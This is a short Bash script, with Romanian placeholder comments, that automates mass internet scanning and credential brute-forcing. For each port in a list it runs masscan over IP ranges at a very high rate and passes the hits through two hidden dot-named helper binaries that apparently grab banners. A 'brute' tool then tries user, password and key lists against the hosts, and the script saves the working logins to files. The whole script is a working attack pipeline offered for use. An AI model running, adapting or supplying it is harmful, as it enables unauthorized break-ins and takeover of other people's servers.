#!/bin/bash
# All credits goin to Maz4id and Raducu
locatie_lista_ports="aici pui locatia de la fisieru cu ports"
ranges="aici bagi fisieru cu ranges"

while IFS= read -r port
do
file=$(openssl rand -hex 7)
masscan -p$port  -iL $ranges --max-rate 100000 > ips1
cat ips1 |awk '{print $6}' > ip
./.bozn 5000 $port ip
./.fozn banner.log
rm -rf banner.log
./brute 10000 ips.lst pass $port 10 key user
mv good.txt good_$file.txt

done < $locatie_lista_ports
